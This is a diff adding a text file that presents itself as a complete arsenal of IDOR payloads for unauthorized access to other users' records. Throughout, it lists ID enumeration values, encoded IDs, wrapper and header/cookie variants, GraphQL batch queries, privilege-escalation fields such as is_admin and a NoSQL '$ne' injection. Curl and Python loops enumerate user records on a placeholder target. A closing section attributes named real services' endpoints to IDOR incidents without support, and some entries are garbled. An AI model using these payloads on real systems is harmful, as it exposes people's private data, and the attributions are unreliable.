@@ -1,0 +1,261 @@
+================================================================================
+INSECURE DIRECT OBJECT REFERENCE (IDOR) PAYLOADS - COMPLETE ARSENAL
+================================================================================
+
+================================================================================
+BASIC IDOR PAYLOADS (Sequential Enumeration)
+================================================================================
+
+?id=1 – Single digit
+?id=2 – Increment by 1
+?id=3 – Increment
+?id=10 – Double digit
+?id=100 – Triple digit
+?id=999 – Near maximum
+?id=1000 – Four digits
+?id=999999999 – Large number
+?id=0 – Zero value
+?id=-1 – Negative value
+?id=-10 – Negative double digit
+?id=0 – Null equivalent
+?id=null – Null string
+?id= – Empty value
+?id=admin – String injection
+?id=administrator – Admin string
+?id=owner – Owner string
+?user_id=1 – User ID parameter
+?user_id=2 – Incremented
+?userId=1 – CamelCase
+?userId=2 – CamelCase increment
+?USER_ID=1 – Uppercase
+?Uid=1 – Shortened
+
+================================================================================
+IDOR IN URL PATH (RESTful)
+================================================================================
+
+/user/1 – User endpoint
+/user/2 – Incremented
+/user/100 – Large value
+/user/0 – Zero
+/user/-1 – Negative
+/user/admin – Admin user
+/user/administrator – Full admin
+/profile/1 – Profile endpoint
+/profile/2 – Incremented
+/account/1 – Account endpoint
+/account/2 – Incremented
+/order/1 – Order endpoint
+/order/2 – Incremented
+/transaction/1 – Transaction endpoint
+/transaction/2 – Incremented
+/message/1 – Message endpoint
+/message/2 – Incremented
+/document/1 – Document endpoint
+/document/2 – Incremented
+
+================================================================================
+IDOR IN POST BODY PAYLOADS
+================================================================================
+
+{"id":1} – JSON single
+{"id":2} – Incremented
+{"user_id":1} – User ID JSON
+{"user_id":2} – Incremented
+{"userId":1} – CamelCase JSON
+{"userId":2} – Incremented
+{"account":{"id":1}} – Nested JSON
+{"account":{"id":2}} – Nested increment
+{"data":{"user_id":1}} – Wrapped JSON
+{"data":{"user_id":2}} – Wrapped increment
+id=1 – Form data
+id=2 – Form increment
+user_id=1 – Form user ID
+user_id=2 – Form increment
+
+================================================================================
+IDOR WITH UUID/GUID PAYLOADS
+================================================================================
+
+?id=550e8400-e29b-41d4-a716-446655440000 – Standard UUID
+?id=550e8400-e29b-41d4-a716-446655440001 – Increment last block
+?id=550e8400-e29b-41d4-a716-446655440002 – Increment further
+?id=550e8400-e29b-41d4-a716-446655439999 – Decrement last block
+?id=550e8400-e29b-41d4-a716-000000000000 – Zero out
+?id=00000000-0000-0000-0000-000000000001 – Minimal UUID
+?id=ffffffff-ffff-ffff-ffff-ffffffffffff – Max UUID
+/uuid/550e8400-e29b-41d4-a716-446655440000 – UUID in path
+/uuid/550e8400-e29b-41d4-a716-446655440001 – Incremented path
+
+================================================================================
+IDOR WITH HASHED/ENCODED IDS (Base64)
+================================================================================
+
+MTIz – Base64 of 123
+MTI0 – Base64 of 124
+MTI1 – Base64 of 125
+MQ== – Base64 of 1
+Mg== – Base64 of 2
+Mw== – Base64 of 3
+MTAw – Base64 of 100
+YWRtaW4= – Base64 of "admin"
+YWRtaW5pc3RyYXRvcg== – Base64 of "administrator"
+dXNlcg== – Base64 of "user"
+cm9vdA== – Base64 of "root"
+
+================================================================================
+IDOR WITH HASHED/ENCODED IDS (Base32/Base36/Hex)
+================================================================================
+
+MTC – Base32 of "1" in some encodings
+MTY – Base32 variant
+1 – Hex of 1
+a – Hex of 10 (requires decoding)
+64 – Hex of 100
+a1 – Hex of 161
+1a – Hex variant
+admin – No encoding
+admin123 – Mixed
+aGVsbG8= – Base64 of "hello"
+d29ybGQ= – Base64 of "world"
+
+================================================================================
+IDOR WITH WRAPPER PARAMETERS (Bypass Validation)
+================================================================================
+
+?user[id]=1 – Array wrapper
+?user[id]=2 – Array increment
+?data[user_id]=1 – Data wrapper
+?data[user_id]=2 – Data increment
+?params[user]=1 – Params wrapper
+?params[user]=2 – Params increment
+?filter[id]=1 – Filter wrapper
+?filter[id]=2 – Filter increment
+?search[user_id]=1 – Search wrapper
+?search[user_id]=2 – Search increment
+
+================================================================================
+IDOR WITH JSON PARAMETER POLLUTION
+================================================================================
+
+{"user_id":1, "user_id":2} – Duplicate key (last wins)
+{"user_id":[1,2]} – Array injection
+{"user_id":{"$ne":null}} – NoSQL injection combined
+{"id":1,"role":"admin"} – Additional field injection
+{"id":2,"is_admin":true} – Privilege escalation via extra field
+{"id":1,"debug":true} – Debug parameter
+
+================================================================================
+IDOR WITH GRAPHQL (Arguments & Batch Queries)
+================================================================================
+
+{ user(id: 1) { id name email } } – Single user query
+{ user(id: 2) { id name email } } – Incremented
+{ user1: user(id: 1) { name }, user2: user(id: 2) { name } } – Batch query
+{ users(ids: [1,2,3,4,5]) { id name email } } – List of IDs
+{ organization(id: 1) { users { id email } } } – Nested IDOR
+query { user(id: 1) { ...userFields } } fragment userFields on User { id name email role } – Fragment query
+
+================================================================================
+IDOR WITH MULTI-LEVEL (Organization/Department/User)
+================================================================================
+
+/org/1/user/2 – Org 1, User 2
+/org/1/user/3 – Change user only
+/org/2/user/2 – Change org only (check cross-org access)
+/org/2/user/3 – Change both
+/org/1/dept/1/user/1 – Three-level IDOR
+/org/1/dept/2/user/1 – Change department
+/org/2/dept/1/user/1 – Change organization
+
+================================================================================
+IDOR WITH VERSIONING (API Version Changes)
+================================================================================
+
+/api/v1/user/1 – Version 1
+/api/v2/user/1 – Version 2 (may have different auth)
+/api/v3/user/1 – Version 3
+/v1/user/1 – Shorter path
+/v2/user/1 – Version 2
+/api/1.0/user/1 – Decimal version
+/api/1.1/user/1 – Subversion
+/api/latest/user/1 – Latest version
+
+================================================================================
+IDOR WITH STATUS/PARAMETER VARIATIONS
+================================================================================
+
+?id=1&status=active – With status
+?id=1&include_deleted=true – Include deleted flag
+?id=1&debug=true – Debug mode
+?id=1&admin=true – Admin flag injection
+?id=1&bypass=true – Bypass flag
+?id=1&view=all – View all mode
+?id=1&full=true – Full data mode
+?id=1&raw=true – Raw output mode
+
+================================================================================
+IDOR WITH HEADER INJECTION
+================================================================================
+
+X-User-ID: 1 – User ID header
+X-User-ID: 2 – Increment
+X-Target-User: 1 – Target user header
+X-Target-User: 2 – Increment
+X-Original-User: 1 – Original user
+X-Original-User: 2 – Increment
+X-User-Id: 1 – Hyphenated
+X-UID: 1 – Short header
+X-Account-Id: 1 – Account header
+X-Account-Id: 2 – Increment
+
+================================================================================
+IDOR WITH COOKIE INJECTION
+================================================================================
+
+user_id=1 – Cookie
+user_id=2 – Increment
+uid=1 – Short cookie
+uid=2 – Increment
+account_id=1 – Account cookie
+account_id=2 – Increment
+userId=1 – Cookie camelCase
+userId=2 – Increment
+
+================================================================================
+IDOR BATCH ENUMERATION TECHNIQUES (For Learning/Reference)
+================================================================================
+
+for i in range(1, 1000): requests.get(f'/api/user/{i}') – Python enumeration
+curl -s 'https://target.com/api/user?id=1' – Single curl
+for i in {1..100}; do curl -s "https://target.com/api/user/$i"; done – Bash enumeration
+seq 1 100 | xargs -I{} curl -s "https://target.com/api/user/{}" – Xargs enumeration
+
+================================================================================
+IDOR RESPONSE INDICATORS (What to Look For)
+================================================================================
+
+200 OK – Success (different data indicates IDOR)
+403 Forbidden – Access denied (protected)
+404 Not Found – ID doesn't exist
+302 Redirect – Redirect to own profile (protected)
+Content-Length difference – Different data size
+name: "another_user" – Different user name
+email: "other@example.com" – Different email
+role: "admin" – Different role in response
+"data": {...} – Different content structure
+Access Denied – Explicit denial
+
+================================================================================
+REAL-WORLD IDOR NOTABLE PAYLOADS
+================================================================================
+
+https://facebook.com/notes/{note_id}/?uid={attacker_uid} – Facebook IDOR (2019)
+https://instagram.com/api/v1/users/{user_id}/info/ – Instagram IDOR (2021)
+https://api.uber.com/v1/riders/{rider_id}/trips – Uber IDOR (2022)
+https://api.twitter.com/1.1/statuses/show/{tweet_id}.json – Twitter IDOR (2018)
+https://www.linkedin.com/voyager/api/identity/profiles/{profile_id} – LinkedIn IDOR (2020)
+
+================================================================================
+END OF IDOR PAYLOADS
+================================================================================
